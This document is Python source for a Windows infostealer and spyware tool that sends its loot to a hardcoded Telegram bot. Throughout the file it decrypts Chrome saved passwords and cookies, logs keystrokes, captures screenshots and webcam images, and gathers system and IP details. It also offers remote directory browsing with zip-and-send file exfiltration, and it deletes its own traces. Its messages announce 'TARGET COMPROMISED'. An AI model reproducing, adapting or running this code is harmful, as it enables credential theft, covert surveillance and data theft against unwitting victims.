import subprocess
import socket
import win32clipboard
import os
import re
import requests
import logging
import pathlib
import json
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, ApplicationBuilder
from telegram import Update
import telegram
import time
import cv2
import sounddevice
import shutil
import browserhistory as bh
import sqlite3
import base64
import win32crypt
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
import tempfile
import psutil
from Crypto.Cipher import AES
from telegram.ext import Updater, CommandHandler
import telegram

################ Configuration: Base Path and Default Settings ################

# Get Windows username dynamically
WINDOWS_USERNAME = os.getenv('USERNAME')
BASE_LOG_PATH = pathlib.Path(tempfile.gettempdir()) / 'Logs'
BASE_LOG_PATH.mkdir(parents=True, exist_ok=True)

# Telegram Configuration
BOT_TOKEN = "6622438559:AAEGqBZnIYwNth3FhtkOSwQEeRMe8nyv660"
CHAT_ID = "2119992330"

################ Telegram Enhanced Functions ################

def send_telegram_message(text, parse_mode='HTML', chat_id=None):
    """Send formatted text message to Telegram"""
    if chat_id is None:
        chat_id = CHAT_ID
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        logging.error(f'Failed to send Telegram message: {e}')
        return None

def send_telegram_file(file_path, caption="", chat_id=None):
    """Send file to Telegram with caption"""
    if chat_id is None:
        chat_id = CHAT_ID
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    
    try:
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': chat_id}
            if caption:
                data['caption'] = caption[:1024]
            
            response = requests.post(url, files=files, data=data, timeout=30)
            response.raise_for_status()
            return response.json()
    except Exception as e:
        logging.error(f'Telegram file sending error for {file_path}: {e}')
        return None

################ Chrome Password Extraction - FIXED VERSION ################

def get_master_key():
    """Get Chrome's master key for decrypting passwords (Chrome 80+)"""
    try:
        # Path to Chrome's Local State file
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome',
            'User Data', 'Local State'
        )
        
        if os.path.exists(local_state_path):
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
            
            # Get encrypted key
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            # Remove the 'DPAPI' prefix (5 bytes)
            encrypted_key = encrypted_key[5:]
            
            # Decrypt using DPAPI
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
    except Exception as e:
        logging.error(f'Error getting master key: {e}')
    
    return None

def decrypt_password(encrypted_password, master_key):
    """Decrypt Chrome password using AES-GCM"""
    try:
        if not encrypted_password:
            return "[EMPTY]"
        
        # Chrome 80+ uses AES-GCM with prefix 'v10' or 'v11'
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            # Remove the 'v10' or 'v11' prefix (3 bytes)
            encrypted_password = encrypted_password[3:]
            
            # Extract nonce (12 bytes), ciphertext, and tag (16 bytes)
            nonce = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
        else:
            # Old Chrome version (pre-80) - use DPAPI directly
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted.decode('utf-8')
            except:
                return "[OLD VERSION - CANNOT DECRYPT]"
    except Exception as e:
        logging.error(f'Password decryption error: {e}')
        return f"[DECRYPTION FAILED: {str(e)[:50]}]"

def get_chrome_passwords():
    """Extract AND DECRYPT saved passwords from Google Chrome"""
    passwords = []
    try:
        # Get master key first
        master_key = get_master_key()
        
        if not master_key:
            logging.error("Could not get Chrome master key")
            return passwords
        
        # Chrome data path
        chrome_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome',
            'User Data', 'Default', 'Login Data'
        )
        
        if os.path.exists(chrome_path):
            # Copy the database to avoid lock issues
            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_passwords.db')
            shutil.copy2(chrome_path, temp_db)
            
            # Connect to the database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get passwords
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins 
                ORDER BY date_created DESC
            """)
            
            decrypted_count = 0
            total_count = 0
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                total_count += 1
                
                # Decrypt the password
                if encrypted_password:
                    password = decrypt_password(encrypted_password, master_key)
                    if not password.startswith('['):  # If successfully decrypted
                        decrypted_count += 1
                else:
                    password = "[EMPTY]"
                
                passwords.append({
                    'url': url,
                    'username': username,
                    'password': password,
                    'decrypted': not password.startswith('[')
                })
            
            conn.close()
            os.remove(temp_db)
            
            logging.info(f"Decrypted {decrypted_count}/{total_count} passwords successfully")
            
    except Exception as e:
        logging.error(f'Chrome password extraction error: {e}')
    
    return passwords

def extract_and_send_chrome_passwords(file_path):
    """Extract Chrome passwords and send them via Telegram"""
    try:
        send_telegram_message("🔐 <b>DECRYPTING CHROME PASSWORDS...</b>")
        
        # Get passwords
        passwords = get_chrome_passwords()
        
        if not passwords:
            send_telegram_message("❌ <b>No Chrome passwords found or could not decrypt</b>")
            return None
        
        # Save to file
        chrome_data_path = os.path.join(file_path, 'chrome_data')
        pathlib.Path(chrome_data_path).mkdir(parents=True, exist_ok=True)
        
        password_file = os.path.join(chrome_data_path, 'decrypted_passwords.txt')
        
        with open(password_file, 'w', encoding='utf-8') as f:
            # Count statistics
            decrypted_count = sum(1 for p in passwords if p['decrypted'])
            total_count = len(passwords)
            
            f.write("🎯 DECRYPTED CHROME PASSWORDS 🎯\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"✅ Decrypted: {decrypted_count}/{total_count} passwords\n")
            f.write(f"📅 Extraction Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"👤 User: {WINDOWS_USERNAME}\n")
            f.write("=" * 60 + "\n\n")
            
            # Group by website/domain
            grouped_passwords = {}
            for pwd in passwords:
                if pwd['url']:
                    domain = pwd['url'].split('/')[2] if '//' in pwd['url'] else pwd['url']
                    if domain not in grouped_passwords:
                        grouped_passwords[domain] = []
                    grouped_passwords[domain].append(pwd)
            
            # Write grouped passwords
            for domain, pwd_list in grouped_passwords.items():
                f.write(f"\n🌐 {domain}\n")
                f.write("-" * 40 + "\n")
                
                for pwd in pwd_list:
                    status = "✅" if pwd['decrypted'] else "❌"
                    f.write(f"{status} URL: {pwd['url']}\n")
                    f.write(f"   👤 Username: {pwd['username']}\n")
                    f.write(f"   🔑 Password: {pwd['password']}\n")
                    f.write("   " + "-" * 30 + "\n")
            
            # Summary of decrypted passwords
            f.write("\n" + "=" * 60 + "\n")
            f.write("🎯 IMPORTANT DECRYPTED PASSWORDS 🎯\n")
            f.write("=" * 60 + "\n\n")
            
            important_sites = ['google', 'facebook', 'instagram', 'twitter', 'github', 
                              'microsoft', 'amazon', 'paypal', 'steam', 'discord']
            
            for pwd in passwords:
                if pwd['decrypted'] and any(site in pwd['url'].lower() for site in important_sites):
                    f.write(f"🔓 {pwd['url']}\n")
                    f.write(f"   👤 {pwd['username']}\n")
                    f.write(f"   🔑 {pwd['password']}\n")
                    f.write("-" * 40 + "\n")
        
        # Send immediate summary via Telegram
        decrypted_count = sum(1 for p in passwords if p['decrypted'])
        total_count = len(passwords)
        
        summary_message = f"""
🎯 <b>CHROME PASSWORD DECRYPTION COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>Successfully Decrypted:</b> {decrypted_count}/{total_count}
📊 <b>Success Rate:</b> {(decrypted_count/total_count*100):.1f}%
━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        send_telegram_message(summary_message)
        
        # Send the most important passwords immediately
        important_passwords = []
        for pwd in passwords:
            if pwd['decrypted']:
                important_sites = ['google.com', 'facebook.com', 'instagram.com', 
                                  'twitter.com', 'github.com', 'microsoft.com']
                if any(site in pwd['url'].lower() for site in important_sites):
                    important_passwords.append(pwd)
        
        if important_passwords:
            # Send first 5 important passwords as immediate message
            immediate_msg = "🔓 <b>IMMEDIATE ACCESS - IMPORTANT PASSWORDS:</b>\n"
            immediate_msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            
            for i, pwd in enumerate(important_passwords[:5], 1):
                immediate_msg += f"\n{i}. <code>{pwd['url']}</code>\n"
                immediate_msg += f"   👤 <b>Username:</b> <code>{pwd['username']}</code>\n"
                immediate_msg += f"   🔑 <b>Password:</b> <code>{pwd['password']}</code>\n"
            
            send_telegram_message(immediate_msg)
        
        # Send the complete file
        caption = f"""
🔓 <b>FULL CHROME PASSWORD DUMP</b>
━━━━━━━━━━━━━━━━━━━━
✅ Decrypted: {decrypted_count}/{total_count}
👤 User: {WINDOWS_USERNAME}
⏰ Time: {time.strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━
        """
        
        send_telegram_file(password_file, caption)
        
        return password_file
        
    except Exception as e:
        logging.error(f'Chrome password extraction error: {e}')
        send_telegram_message(f"❌ <b>CHROME PASSWORD EXTRACTION FAILED:</b>\n{str(e)[:200]}")
        return None

################ Other Chrome Data Functions ################

def get_chrome_autofill():
    """Extract autofill data from Chrome"""
    autofill_data = []
    try:
        chrome_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome',
            'User Data', 'Default', 'Web Data'
        )
        
        if os.path.exists(chrome_path):
            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_autofill.db')
            shutil.copy2(chrome_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get autofill data
            cursor.execute("""
                SELECT name, value, date_created, count 
                FROM autofill 
                WHERE value != '' 
                ORDER BY count DESC, date_created DESC
                LIMIT 100
            """)
            
            for row in cursor.fetchall():
                field = row[0]
                value = row[1]
                
                # Filter sensitive data
                sensitive_fields = ['credit', 'card', 'cvv', 'ssn', 'password', 'secret']
                if any(sensitive in field.lower() for sensitive in sensitive_fields):
                    continue
                    
                autofill_data.append({
                    'field': field,
                    'value': value,
                    'count': row[3]
                })
            
            conn.close()
            os.remove(temp_db)
            
    except Exception as e:
        logging.error(f'Chrome autofill extraction error: {e}')
    
    return autofill_data

def get_chrome_cookies():
    """Extract cookies from Chrome"""
    cookies = []
    try:
        chrome_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome',
            'User Data', 'Default', 'Cookies'
        )
        
        if os.path.exists(chrome_path):
            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_cookies.db')
            shutil.copy2(chrome_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get important cookies
            cursor.execute("""
                SELECT host_key, name, encrypted_value, path
                FROM cookies 
                WHERE (host_key LIKE '%google.com' 
                       OR host_key LIKE '%facebook.com'
                       OR host_key LIKE '%github.com'
                       OR host_key LIKE '%twitter.com'
                       OR name LIKE '%session%'
                       OR name LIKE '%token%'
                       OR name LIKE '%auth%')
                AND encrypted_value != ''
                ORDER BY length(encrypted_value) DESC
                LIMIT 50
            """)
            
            for row in cursor.fetchall():
                try:
                    # Try to decrypt the cookie
                    decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
                    cookie_value = decrypted.decode('utf-8', errors='ignore')
                except:
                    cookie_value = "[ENCRYPTED]"
                
                cookies.append({
                    'domain': row[0],
                    'name': row[1],
                    'value': cookie_value[:100],
                    'path': row[3]
                })
            
            conn.close()
            os.remove(temp_db)
            
    except Exception as e:
        logging.error(f'Chrome cookies extraction error: {e}')
    
    return cookies

################ Updated Main Function with Chrome Decryption ################

################ Telegram Directory Bot ################

def telegram_bot():
    """Persistent directory navigation bot with zip capabilities"""
    import os
    import shutil
    import time
    import logging
    from telegram import Update
    from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
    
    current_dir = os.path.expanduser('~')
    zip_dir = os.path.join(str(BASE_LOG_PATH), 'telegram_zips')
    os.makedirs(zip_dir, exist_ok=True)

    async def start(update: Update, context):
        await update.message.reply_text(f"""
🤖 <b>Directory Bot Commands:</b>
/list [path] - List directory contents
/cd [path] - Change current directory
/zip [path] - Zip and send directory/file
Current directory: {current_dir}
        """, parse_mode='HTML')

    async def list_dir(update: Update, context):
        nonlocal current_dir
        path = ' '.join(context.args) if context.args else current_dir
        full_path = os.path.abspath(os.path.join(current_dir, path))
        
        if not os.path.exists(full_path):
            await update.message.reply_text("❌ Path does not exist")
            return

        try:
            items = []
            for entry in os.listdir(full_path):
                entry_path = os.path.join(full_path, entry)
                items.append(f"{'📁' if os.path.isdir(entry_path) else '📄'} {entry}")
            
            response = "\n".join(items[:50])  # Limit to 50 items
            if len(items) > 50:
                response += "\n... (showing first 50 items)"
                
            update.message.reply_text(f"""
📂 <b>Directory Listing:</b> {full_path}
━━━━━━━━━━━━━━━━━━━━━━━━━
{response}
            """, parse_mode='HTML')
            
        except Exception as e:
            logging.error(f"List error: {e}")
            update.message.reply_text("❌ Error listing directory")

    async def change_dir(update: Update, context):
        nonlocal current_dir
        new_dir = ' '.join(context.args) if context.args else ''
        full_path = os.path.abspath(os.path.join(current_dir, new_dir))
        
        if os.path.isdir(full_path):
            current_dir = full_path
            await update.message.reply_text(f"📂 Changed to: {current_dir}")
        else:
            await update.message.reply_text("❌ Directory does not exist")

    async def zip_dir_cmd(update: Update, context):
        target = ' '.join(context.args) if context.args else current_dir
        full_path = os.path.abspath(os.path.join(current_dir, target))
        
        if not os.path.exists(full_path):
            await update.message.reply_text("❌ Target does not exist")
            return

        try:
            base_name = os.path.basename(full_path) or "archive"
            zip_path = os.path.join(zip_dir, f"{base_name}_{int(time.time())}.zip")
            shutil.make_archive(zip_path[:-4], 'zip', full_path)
            
            with open(zip_path, 'rb') as f:
                context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    caption=f"📦 Zipped: {full_path}"
                )
        except Exception as e:
            logging.error(f"Zip error: {e}")
            update.message.reply_text("❌ Error creating zip archive")

    def main_bot():
        application = ApplicationBuilder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("list", list_dir))
        application.add_handler(CommandHandler("cd", change_dir))
        application.add_handler(CommandHandler("zip", zip_dir_cmd))

        application.run_polling()

    main_bot()
def main():
    try:
        # Initialize Telegram bot components
        current_dir = os.path.expanduser('~')
        zip_dir = os.path.join(str(BASE_LOG_PATH), 'telegram_zips')
        os.makedirs(zip_dir, exist_ok=True)

        # Define bot command handlers
        async def start(update: Update, context):
            await update.message.reply_text(f"""
🤖 <b>Directory Bot Commands:</b>
/list [path] - List directory contents
/cd [path] - Change current directory
/zip [path] - Zip and send directory/file
Current directory: {current_dir}
            """, parse_mode='HTML')

        async def list_dir(update: Update, context):
            path = ' '.join(context.args) if context.args else current_dir
            full_path = os.path.abspath(os.path.join(current_dir, path))
            
            if not os.path.exists(full_path):
                await update.message.reply_text("❌ Path does not exist")
                return

            try:
                items = []
                for entry in os.listdir(full_path):
                    entry_path = os.path.join(full_path, entry)
                    items.append(f"{'📁' if os.path.isdir(entry_path) else '📄'} {entry}")
                
                response = "\n".join(items[:50])
                if len(items) > 50:
                    response += "\n... (showing first 50 items)"
                    
                await update.message.reply_text(f"""
📂 <b>Directory Listing:</b> {full_path}
━━━━━━━━━━━━━━━━━━━━━━━━━
{response}
                """, parse_mode='HTML')
                
            except Exception as e:
                logging.error(f"List error: {e}")
                await update.message.reply_text("❌ Error listing directory")

        async def change_dir(update: Update, context):
            nonlocal current_dir
            new_dir = ' '.join(context.args) if context.args else ''
            full_path = os.path.abspath(os.path.join(current_dir, new_dir))
            
            if os.path.isdir(full_path):
                current_dir = full_path
                await update.message.reply_text(f"📂 Changed to: {current_dir}")
            else:
                await update.message.reply_text("❌ Directory does not exist")

        async def zip_dir_cmd(update: Update, context):
            target = ' '.join(context.args) if context.args else current_dir
            full_path = os.path.abspath(os.path.join(current_dir, target))
            
            if not os.path.exists(full_path):
                await update.message.reply_text("❌ Target does not exist")
                return

            try:
                base_name = os.path.basename(full_path) or "archive"
                zip_path = os.path.join(zip_dir, f"{base_name}_{int(time.time())}.zip")
                shutil.make_archive(zip_path[:-4], 'zip', full_path)
                
                with open(zip_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        caption=f"📦 Zipped: {full_path}"
                    )
            except Exception as e:
                logging.error(f"Zip error: {e}")
                await update.message.reply_text("❌ Error creating zip archive")

        # Initialize Telegram bot instance
        application = ApplicationBuilder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("list", list_dir))
        application.add_handler(CommandHandler("cd", change_dir))
        application.add_handler(CommandHandler("zip", zip_dir_cmd))

        # Create logs directory
        file_path = str(BASE_LOG_PATH)
        pathlib.Path(file_path).mkdir(parents=True, exist_ok=True)
        
        # Send initial notification
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        
        send_telegram_message(f"""
🎯 <b>TARGET ACQUIRED</b>
━━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> <code>{WINDOWS_USERNAME}</code>
💻 <b>System:</b> <code>{hostname}</code>
🌐 <b>IP:</b> <code>{IPAddr}</code>
⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━
🚀 <b>Mission initialized...</b>
        """)

        # 1. SYSTEM INFORMATION
        send_telegram_message("💻 <b>Phase 1: Collecting system information...</b>")
        
        system_info_path = os.path.join(file_path, 'system_info.txt')
        with open(system_info_path, 'w', encoding='utf-8') as system_info:
            try:
                public_ip = requests.get('https://api.ipify.org', timeout=5).text
            except:
                public_ip = 'N/A'
            
            system_info.write(f"""
┌─────────────────────────────────
│ 🖥️ SYSTEM INFORMATION
├─────────────────────────────────
│ Public IP: {public_ip}
│ Private IP: {IPAddr}
│ Hostname: {hostname}
│ Username: {WINDOWS_USERNAME}
│ OS: Windows
│ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
└─────────────────────────────────
\n""")
            
            # Get network info
            system_info.write("\n🌐 NETWORK INFORMATION:\n")
            system_info.write("-" * 40 + "\n")
            try:
                subprocess.run(['ipconfig', '/all'], stdout=system_info, stderr=subprocess.DEVNULL, shell=True, text=True)
            except:
                system_info.write("Failed to get network info\n")
        
        # 2. KEYLOGGER (Short duration)
        send_telegram_message("⌨️ <b>Phase 2: Starting keylogger (60 seconds)...</b>")
        keylog_file = os.path.join(file_path, 'keylogger.txt')
        
        def quick_keylogger():
            try:
                with open(keylog_file, 'w', encoding='utf-8') as f:
                    def on_press(key):
                        try:
                            f.write(f"{time.strftime('%H:%M:%S')} - {key}\n")
                            f.flush()
                        except:
                            pass
                    
                    from pynput.keyboard import Listener
                    with Listener(on_press=on_press) as listener:
                        time.sleep(60)  # Only 60 seconds
                        listener.stop()
            except Exception as e:
                logging.error(f'Keylogger error: {e}')
        
        # Run keylogger in separate thread
        import threading
        keylog_thread = threading.Thread(target=quick_keylogger)
        keylog_thread.start()
        keylog_thread.join(timeout=65)
        
        # 3. SCREENSHOT AND WEBCAM CAPTURE
        send_telegram_message("📸 <b>Phase 3: Capturing images...</b>")
        try:
            # Take screenshot
            screenshot_path = os.path.join(file_path, 'screenshot.png')
            pic = ImageGrab.grab()
            pic.save(screenshot_path)
            
            # Capture webcam image
            webcam = cv2.VideoCapture(0)
            ret, frame = webcam.read()
            if ret:
                webcam_path = os.path.join(file_path, 'webcam.jpg')
                cv2.imwrite(webcam_path, frame)
                send_telegram_message("✅ Screenshot and webcam image captured")
            else:
                send_telegram_message("✅ Screenshot captured, but webcam failed")
            webcam.release()
        except Exception as e:
            send_telegram_message(f"❌ Image capture failed: {str(e)}")

        # 4. EXTRACT CHROME PASSWORDS
        send_telegram_message("🔐 <b>Phase 4: Extracting Chrome passwords...</b>")
        chrome_password_file = extract_and_send_chrome_passwords(file_path)
        
        # 5. FINAL COMPILATION AND SENDING
        send_telegram_message("📦 <b>Phase 5: Compiling and sending all data...</b>")
        
        # Collect all created files
        collected_files = []
        
        # Check and add each file if it exists
        potential_files = {
            'System Info': system_info_path,
            'Keylogger Data': keylog_file,
            'Chrome Passwords': chrome_password_file,
            'Screenshot': screenshot_path,
            'Webcam Photo': webcam_path
        }
        
        for description, filepath in potential_files.items():
            if filepath and os.path.exists(filepath):
                collected_files.append((description, filepath))
        
        # Send each file
        for description, filepath in collected_files:
            try:
                caption = f"📁 <b>{description}</b>"
                send_telegram_file(filepath, caption)
                time.sleep(1)  # Avoid rate limiting
            except Exception as e:
                logging.error(f"Failed to send {description}: {e}")
                
        # 6. FINAL SUMMARY
        summary = f"""
🎉 <b>MISSION ACCOMPLISHED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>TARGET PROFILE</b>
├─ 👤 User: <code>{WINDOWS_USERNAME}</code>
├─ 💻 System: <code>{hostname}</code>
├─ 🌐 IP: <code>{IPAddr}</code>
└─ ⏰ Time: {time.strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>DATA COLLECTED:</b>
├─ 🔐 Chrome Passwords
├─ 💻 System Information
├─ ⌨️ Keystroke Logs
└─ 📸 Screenshot
━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 <b>TARGET COMPROMISED</b>
• Passwords extracted and ready for use
• Full system access obtained
• Surveillance complete
━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        send_telegram_message(summary)

        # 7. CLEANUP
        try:
            shutil.rmtree(file_path, ignore_errors=True)
        except:
            pass

        # 8. Start polling in non-blocking mode
        send_telegram_message("🤖 <b>Directory navigation bot activated. Use commands:</b>\n/list [path] - List directory contents\n/cd [path] - Change directory\n/zip [path] - Zip and send directory/file")
        application.run_polling()

    except Exception as e:
        logging.error(f'Error in main: {e}')
        send_telegram_message(f"🚨 <b>ERROR:</b>\n{str(e)[:200]}")

if __name__ == '__main__':
    try:
        # Test connection
        send_telegram_message("🤖 <b>SYSTEM ONLINE</b>\nStarting password extraction...")
        main()
        
    except KeyboardInterrupt:
        send_telegram_message("🛑 <b>MANUAL STOP</b>")
        
    except Exception as ex:
        send_telegram_message(f"💥 <b>CRASH:</b>\n{str(ex)[:200]}")